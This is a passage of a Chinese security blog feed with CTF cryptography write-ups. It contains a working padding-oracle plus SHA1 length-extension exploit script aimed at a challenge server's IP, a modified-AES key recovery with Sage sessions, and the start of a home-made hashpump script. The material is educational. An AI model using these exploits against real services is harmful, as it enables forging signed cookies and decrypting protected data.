sys.stdin.readline().strip()</span><br><span class="line">        data = binascii.unhexlify(data_hex)</span><br><span class="line">        <span class="keyword">assert</span>(len(data) &gt; iv_len + hash_len)</span><br><span class="line">        iv, cookie_padded_encrypted, hv = data[:iv_len], data[iv_len: -hash_len], data[-hash_len:]</span><br><span class="line">        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line">        cookie_padded = decryptor.update(cookie_padded_encrypted) + decryptor.finalize()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cookie = unpad(cookie_padded)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">"Invalid padding"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_hash(cookie, hv):</span><br><span class="line">            print(<span class="string">"Invalid hash"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        info = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> cookie.split(<span class="string">b";"</span>):</span><br><span class="line">            k, v = _.split(<span class="string">b":"</span>)</span><br><span class="line">            info[k] = v</span><br><span class="line">        <span class="keyword">if</span> info[<span class="string">b"admin"</span>] == <span class="string">b"1"</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"flag"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                print(<span class="string">"Your flag: %s"</span> %flag)</span><br></pre></td></tr></table></figure><p>很明显的看到可以 <code>padding oracle</code>, 只要满足 <code>info[b&quot;admin&quot;] == b&quot;1&quot;</code> 就可以拿到 <code>flag</code>,<br>但在 <code>cookie</code> 后面设置了 hash 来效验 <code>cookie</code> 的有效性, 但是没有检测重复的键值<br>所以这里可以结合长度扩展攻击, 我们假设 <code>cookie</code> 为 <code>admin:0;username:abcde;password:abcde</code><br>我们可以在原 <code>cookie</code> 后面添加一个 <code>;admin:1</code>, 得到<br><code>admin:0;username:abcde;password:abcde\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\xa8;admin:1</code>,<br>因为顺序的关系, 这将覆盖之前的值, 从而满足条件. 脚本如下<br>一开始没有国内的服务器, 写完下午睡了一觉起来才跑完 233</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> remotecli <span class="comment"># https://github.com/rmb122/remoteCLI</span></span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(byte)</span>:</span></span><br><span class="line">    padlen = <span class="number">16</span> - len(byte) % <span class="number">16</span></span><br><span class="line">    byte += bytearray([padlen] * padlen)</span><br><span class="line">    <span class="keyword">return</span> byte</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addIvLastByte</span><span class="params">(iv, currIndex, midval)</span>:</span></span><br><span class="line">    target = <span class="number">16</span> + <span class="number">1</span> - currIndex</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(currIndex, <span class="number">16</span>):</span><br><span class="line">        iv[i] = midval[i] ^ target</span><br><span class="line">    <span class="keyword">return</span> iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        result.append(a[i] ^ b[i])</span><br><span class="line">    result = bytearray(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">cli = remotecli.CLI()</span><br><span class="line">cli.connect(<span class="string">'207.148.68.109'</span>, <span class="number">20000</span>)</span><br><span class="line">cli.sendLine(<span class="string">'abcde'</span>)</span><br><span class="line">cli.sendLine(<span class="string">'abcde'</span>)</span><br><span class="line"></span><br><span class="line">hv_hex_len = <span class="number">40</span></span><br><span class="line">iv_len = <span class="number">16</span></span><br><span class="line">orgCookie = <span class="string">'admin:0;username:abcde;password:abcde'</span></span><br><span class="line"></span><br><span class="line">cookie = cli.recvLinesUntilHave(<span class="string">'Input your cookie:'</span>)[<span class="number">-2</span>]</span><br><span class="line">print(cookie)</span><br><span class="line">hv_hex = cookie[-hv_hex_len:]</span><br><span class="line">iv = cookie[:iv_len]</span><br><span class="line">cookieEnc = cookie[iv_len: - hv_hex_len]</span><br><span class="line"></span><br><span class="line">fakeHash, fakeCookie = hashpumpy.hashpump(hv_hex, orgCookie, <span class="string">';admin:1'</span>, iv_len)</span><br><span class="line">print(fakeCookie)</span><br><span class="line">print(fakeHash)</span><br><span class="line"></span><br><span class="line">fakeHash = bytearray(unhexlify(fakeHash))</span><br><span class="line">fakeCookie = padding(fakeCookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(fakeCookie) == <span class="number">64</span></span><br><span class="line">dummy = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(fakeCookie) + <span class="number">16</span>)]) <span class="comment"># iv + cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">64</span> + <span class="number">16</span>, <span class="number">16</span>, -iv_len):</span><br><span class="line">    curr = dummy[pos - iv_len:pos]</span><br><span class="line">    iv = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(iv_len)])</span><br><span class="line">    midval = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(iv_len)])</span><br><span class="line">    <span class="keyword">for</span> currIndex <span class="keyword">in</span> range(<span class="number">0</span>, iv_len)[::<span class="number">-1</span>]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">0</span>, <span class="number">256</span>)):</span><br><span class="line">            iv[currIndex] = i</span><br><span class="line">            cli.sendLine(hexlify(iv + curr + fakeHash))</span><br><span class="line">            res = cli.recvline()</span><br><span class="line">            <span class="comment">#print(res)</span></span><br><span class="line">            cli.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Invalid padding"</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                midval[currIndex] = (<span class="number">16</span> - currIndex) ^ iv[currIndex]</span><br><span class="line">                <span class="keyword">if</span> currIndex == <span class="number">0</span>:</span><br><span class="line">                    tmp = xor(midval, fakeCookie[pos-iv_len*<span class="number">2</span>:pos-iv_len])</span><br><span class="line">                    <span class="keyword">for</span> tmpPos <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">                        dummy[pos-iv_len*<span class="number">2</span> + tmpPos] = tmp[tmpPos]</span><br><span class="line">                iv = addIvLastByte(iv, currIndex, midval)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cli.sendLine(hexlify(dummy + fakeHash))</span><br><span class="line">cli.console()</span><br></pre></td></tr></table></figure><h2 id="baby-aes"><a href="#baby-aes" class="headerlink" title="baby_aes"></a>baby_aes</h2><p>这题比较有意思, 操作还是比较硬核的, 主要逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">K = <span class="string">b"\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10"</span></span><br><span class="line">Ke = init(K)</span><br><span class="line"></span><br><span class="line">backend = default_backend()</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">iv = encrypt(key, Ke)</span><br><span class="line">cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)</span><br><span class="line">decryptor = cipher.decryptor()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"Input a hexstr to decrypt:"</span>)</span><br><span class="line">    data = sys.stdin.readline().strip()</span><br><span class="line">    ciphertext = binascii.unhexlify(data)</span><br><span class="line">    plaintext = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    print(<span class="string">"Decrypted result:"</span>)</span><br><span class="line">    print(binascii.hexlify(plaintext).decode())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">    padder = padding.PKCS7(<span class="number">128</span>).padder()</span><br><span class="line">    flag_padded = padder.update(flag) + padder.finalize()</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    flag_encrypted = encryptor.update(flag_padded) + encryptor.finalize()</span><br><span class="line">    print(<span class="string">"Your encrypted flag is:"</span>)</span><br><span class="line">    print(binascii.hexlify(flag_encrypted).decode())</span><br></pre></td></tr></table></figure><p>其中 <code>init</code> 函数是 AES 秘钥扩展, <code>encrypt</code> 是 AES 轮函数, 但是改变了 AES 原来的常数, 这两个函数也是本题的核心, 我们留到后面讲. 这里假设我们已经写出对应的解密函数,</p><p>看到 <code>iv = encrypt(key, Ke)</code>, 可以看到 iv 就是 key 的加密, 只要我们能获得 <code>iv</code>, 就能解密出 <code>key</code>, 从而解密得到 <code>flag</code>.</p><p>注意到这里是用 AES 解密输入的数据, 结合 CBC 模式</p><p><img src="https://i.loli.net/2019/05/19/5ce17ac53478934702.png" alt="CBC"></p><p>我们可以输入两个相同分块(b1 + b1’)长度的数据, 其中解密结果的第二块(o2)是这样算出来的<br><code>xor(AESdec(b1&#39;), b1) = o2</code><br>而 <code>o2</code>, <code>b1</code> 都是已知的, 我们就可以解出 <code>AESdec(b1)</code>, 因为我们输入的两个分块相同,<br>我们将 <code>AESdec(b1)</code> 与 <code>o1</code> xor 一下, 就能得到 <code>iv</code>, 这时只要用 <code>K</code> 解密 <code>iv</code> 就能得到 <code>key</code><br>从而解密 <code>flag</code>.</p><p>但问题就是这里出题人魔改了 AES, 不能直接解密, 这里最好自己写过一遍 AES 的实现, 否则接下来有些部分可能不太方便,<br>首先可以搜到作者魔改的<a href="https://github.com/ricmoo/pyaes/blob/master/pyaes/aes.py" target="_blank" rel="noopener">原代码</a><br>可以看到 Sbox, T1-4 都被修改, 并且没有给出对应的逆变换</p><p><code>S = [0x63, 0x7c, 0x77, 0x7....</code> &lt;-原来的<br><code>S = [0x93 ,0x43 ,0x5D ,0x6....</code> &lt;-魔改之后的</p><p>但是从 <code>rcon = [....0xb3, 0x7d, 0xfa, 0xef, 0xc5, 0x91 ]</code> 这最后几个<br>数据可以看出, 仍然还是在 <code>GF(2^8) mod x^8 + x^4 + x^3 + x + 1</code> 上的, 否则 0xc5 * 2 不会等于 0x91</p><p>所以这里应该只是单纯的改了 Sbox, 不是改其他常数带来的副作用.</p><p>接下来可以看到 T 被完全修改了, 首先了解一下 T 变换是干嘛的,<br>这里借一张图说明<br><img src="https://i.loli.net/2019/05/22/5ce5502037ede37184.png" alt=""></p><p>注: ShiftRow 与 ByteSub 之间的顺序不敏感, 可以在进入变换之前就 ShiftRow 好, 就跟上图一样, 取的不是原矩阵的一行, 而是 ShiftRow 之后矩阵的一行</p><p>T 变换是结合了 ByteSub MixColumn, 将 AES 轮函数中的两步并到一起, 加速效率的一种方法, 如果按照原来的矩阵乘法<br><img src="https://i.loli.net/2019/05/22/5ce551bb6234249389.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d0 &#x3D; 2 * ByteSub(b0) + 3 * ByteSub(b1) + 1 * ByteSub(b2) + 1 * ByteSub(b3)</span><br><span class="line">d1 &#x3D; 1 * ByteSub(b0) + 2 * ByteSub(b1) + 3 * ByteSub(b2) + 1 * ByteSub(b3)</span><br><span class="line">d2 &#x3D; 1 * ByteSub(b0) + 1 * ByteSub(b1) + 2 * ByteSub(b2) + 3 * ByteSub(b3)</span><br><span class="line">d3 &#x3D; 3 * ByteSub(b0) + 1 * ByteSub(b1) + 1 * ByteSub(b2) + 2 * ByteSub(b3)</span><br></pre></td></tr></table></figure><p>算起来非常的麻烦, 但是看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2 * ByteSub(b0)</span><br><span class="line">1 * ByteSub(b0)</span><br><span class="line">1 * ByteSub(b0)</span><br><span class="line">3 * ByteSub(b0)</span><br></pre></td></tr></table></figure><p>可以想到这结构完全是固定的, 因为加密的是字节, 定义域是 0-255, 完全可以将 0-255 的值带入 b0, 将所有值提前算出, 并成 4 个字节, 在使用时查表就行, 大大提高效率. 因为 GF(2^8) 上的加法实际上就是 xor, 所以</p><p><code>MixColumn(ByteSub(b0 b1 b2 b3)) = T1[b0] xor T2[b1] xor T3[b2] xor T4[b3]</code></p><p>在本题中, 假设进入轮函数之前 state 全是 0, 那么这里查表可以直接一步到位 <code>T1[0] ^ T2[0] ^ T3[0] ^ T4[0] = 0xaeaeaeae</code>, 而按照原列混合的矩阵算等于 <code>0x93939393</code> 说明列混合的矩阵也被修改, 这就比较麻烦了, 需要用一下 <code>sage</code>.</p><p>因为假设输入轮函数的 state 全是 0， 那么 subByte 的得到的是 0x93, 而 <code>T[0] = 0xF467D4E9</code>, 原 AES 的因数是 <code>(2, 3, 1, 1)</code>, 这里我们假设魔改之后的是 <code>(cofe[0], cofe[1], cofe[2], cofe[3])</code></p><p>按照上面 T 变换的定义, <code>T[0]</code> 是这么来的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cofe[0] * b0</span><br><span class="line">cofe[3] * b0</span><br><span class="line">cofe[2] * b0</span><br><span class="line">cofe[1] * b0</span><br></pre></td></tr></table></figure><p>而本题 <code>T[0] = 0xF467D4E9</code> 可以写出<br><code>0x93 * cofe[0] = 0xF4</code>,  <code>0x93 * cofe[3] = 0x67</code>, <code>0x93 * cofe[2] = 0xD4</code>, <code>0x93 * cofe[1] = 0xE9</code>,<br>在 0-255 的范围内爆破下,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sage: F.&lt;x&gt; &#x3D; GF(2^8, modulus&#x3D;[1,1,0,1,1,0,0,0,1])</span><br><span class="line">sage: F.modulus()</span><br><span class="line">x^8 + x^4 + x^3 + x + 1</span><br><span class="line">sage: def f(num):</span><br><span class="line">....:     global F</span><br><span class="line">....:     return F.fetch_int(num)</span><br><span class="line">....:</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xf4):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">8</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0x67):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">9</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xd4):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">7</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xe9):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>那么四个因数是 <code>(8, 5, 7, 9)</code>, 还原成矩阵求 GF(2^8) 上的逆矩阵, 再用一下 <code>sage</code>, 当然如果是大佬可以手算 _(:з」∠)_</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sage: c &#x3D; matrix(F, [[f(8), f(5), f(7), f(9)], [f(9), f(8), f(5), f(7)], [f(7), f(9), f(8), f(5)], [f(5), f(7), f(9), f(8)]])</span><br><span class="line">sage: c.inverse()</span><br><span class="line">[      x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1]</span><br><span class="line">[x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1]</span><br><span class="line">[      x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3]</span><br><span class="line">[          x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x]</span><br></pre></td></tr></table></figure><p>转换回数字表示就是<br><code>cofes = (150, 200, 149, 61)</code><br>带进 invMixColumn 就可以正确解密啦, 如果没有自己写过的话, 可以参考我写的<a href="https://github.com/rmb122/Cryptography/blob/master/AES-128-CBC.py" target="_blank" rel="noopener">辣鸡实现</a><br>修改 <code>mixColumn</code> 和 <code>invMixColumn</code> 里面的 <code>polynomialMutil</code> 函数乘的数为矩阵对应位置的数就行了</p><p>既然现在可以解密, 按着上面的思路就能拿 <code>flag</code> 了~<br>接下来 nc 一下, 输入 16 个 1,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input a hexstr to decrypt:</span><br><span class="line">3131313131313131313131313131313131313131313131313131313131313131</span><br><span class="line">Decrypted result:</span><br><span class="line">3205fe135b595e72c90d2613ada3087812f10dee01e66c4d1e47089a0ff0f18c</span><br><span class="line">Your encrypted flag is:</span><br><span class="line">c2c06ee0e21dae7e5b64fcb84397b4ed920c28bb81a676d817a4b920564bd04dd2a570900ff2e9d5fee9cb74c37c4812</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES <span class="keyword">as</span> stdAES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">K = <span class="string">b"\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10"</span></span><br><span class="line">hexstr = <span class="string">'11111111111111111111111111111111'</span>.encode()</span><br><span class="line">dec = unhexlify(<span class="string">'3205fe135b595e72c90d2613ada3087812f10dee01e66c4d1e47089a0ff0f18c'</span>)</span><br><span class="line">midVal = strxor(dec[<span class="number">16</span>:<span class="number">32</span>], hexstr[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">iv = strxor(dec[<span class="number">0</span>:<span class="number">16</span>], midVal)</span><br><span class="line">aes = AES()</span><br><span class="line">key = aes.decryptBlock(iv, K)</span><br><span class="line">print(key)</span><br><span class="line">print(iv)</span><br><span class="line">flag = unhexlify(<span class="string">'c2c06ee0e21dae7e5b64fcb84397b4ed920c28bb81a676d817a4b920564bd04dd2a570900ff2e9d5fee9cb74c37c4812'</span>)</span><br><span class="line">stdaes = stdAES.new(key, stdAES.MODE_CBC, iv)</span><br><span class="line">print(stdaes.decrypt(flag))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'N\t\x9c\xce*\xfa\xc1\x02\x94\xd1\x02\xf2\xb8d*E'</span></span><br><span class="line"><span class="string">b'\x11\xc5\xc2\xcck\x8e\x03\x0e\xe6&#123;\x1f\xb8\x93b\xc8\xc5'</span></span><br><span class="line"><span class="string">b'RCTF&#123;88358abe-e571-4bdf-95a3-93e9d8ddf558&#125;\x06\x06\x06\x06\x06\x06'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>这样子求解, 比直接爆破四个因数优雅很多, 而且之后遇到类似题目, 修改列混合的因数, 可以直接按照上面的方法通杀</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密码学只做出来两题 baby, 暗示我还是学密码学的 baby (逃&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
      <category term="crypto" scheme="https://rmb122.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>自制一个简单的 Hashpump</title>
    <link href="https://rmb122.com/2019/05/11/%E8%87%AA%E5%88%B6%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-Hashpump/"/>
    <id>https://rmb122.com/2019/05/11/%E8%87%AA%E5%88%B6%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-Hashpump/</id>
    <published>2019-05-10T16:02:02.000Z</published>
    <updated>2019-07-22T01:47:16.148Z</updated>
    
    <content type="html"><![CDATA[<p>在学完 MD5/SHA1 之后, 很快就能搞懂 <code>hashpump</code> 的原理, 本质是因为类 <code>MD</code> 哈希函数<br>包括 MD5, SHA1, SHA2 都是将信息填充为一个 <code>Block</code> 长度的倍数以后分 <code>Block</code> 一轮轮计算的,<br>最后输出的是寄存器拼接在一起的值, 所以假设用以下公式计算签名  </p><a id="more"></a><p>$$ hash(key + msg) = signature $$</p><p>假如已经知道了 <code>signature</code>, <code>msg</code> 以及 <code>key</code> 的长度(在实战中可以爆破), 那么完全是可以将所有 <code>Block</code> 里面除了<br>一开始的 key 之外的的内容算出来. 自然而然可以想到, 我们将计算出 <code>signature</code> 时<br>的状态作为我们的起始状态, 也就是将寄存器的值换成哈希函数的输出, 然后就可以在新的 <code>Block</code><br>的里面伪造任意消息, 因为这时候前面 <code>Block</code> 的内容实际上只是为了 <code>padding</code> 最后的消息长度的正确,<br>所以可以在并在不知道 <code>key</code> 的情况下得到 <code>signature</code>. 这时 <code>msg</code> 就变成了<br><code>原来的 msg + padding + 伪造的 msg</code>.  </p><p>限制就是必须是 <code>key + msg</code> 的顺序, 如果是 <code>msg + key</code> 的顺序, 伪造的 <code>msg</code> 就必须是<br><code>原来的 msg + key + padding + 伪造的 msg</code>, 出现了 key, 而如果我们有 key 了, 还伪造什么呢 233<br>所以局限还是比较大的, 但漏洞总是存在在哪里, 说不定就有开发者用了呢, 对吧. 所以有专门的 <code>HMAC</code> 算法<br>来生成签名, 抛开 opad 和 ipad 啥的, 原理很简单, 就是用  </p><p>$$ hash(key + hash(key + msg)) = signature $$</p><p>这样嵌套的方式来计算签名, 拿到的签名值是外层的 <code>hash</code> 的结果, 而内层的 <code>hash(key + msg)</code> 的值长度是不可控的,<br>显然就不能长度扩展了.  </p><p>了解这些思路, 写脚本就非常的 ez 了. 简单的对 <code>SHA1</code> 的哈希长度扩展的脚本如下.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sha1 <span class="keyword">import</span> SHA1</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(msg)</span>:</span></span><br><span class="line">    length = len(msg)</span><br><span class="line">    pad = length % <span class="number">64</span></span><br><span class="line">    <span class="keyword">if</span> pad &gt;= <span class="number">56</span>:</span><br><span class="line">        pad = (<span class="number">64</span> + <span class="number">56</span>) - pad</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pad = <span class="number">56</span> - pad</span><br><span class="line">    <span class="keyword">if</span> pad &gt; <span class="number">0</span>:</span><br><span class="line">        msg.extend([<span class="number">0x80</span>] + [<span class="number">0</span>] * (pad - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    length *= <span class="number">8</span></span><br><span class="line">    length = length % <span class="number">0x10000000000000000</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        b = (length &amp; <span class="number">0xff00000000000000</span>) &gt;&gt; <span class="number">56</span></span><br><span class="line">        length = length &lt;&lt; <span class="number">8</span></span><br><span class="line">        msg.append(b)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pump</span><span class="params">(orghash, orgmsg, keylen, addmsg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(orgmsg) == str:</span><br><span class="line">        orgmsg = orgmsg.encode()</span><br><span class="line">    <span class="keyword">if</span> type(addmsg) == str:</span><br><span class="line">        addmsg = addmsg.encode()</span><br><span class="line">    <span class="keyword">assert</span> len(orghash) == <span class="number">40</span>  <span class="comment"># sha1 20 字节用 16 进制表示为 40 个字符长度</span></span><br><span class="line">    regs = unpack(<span 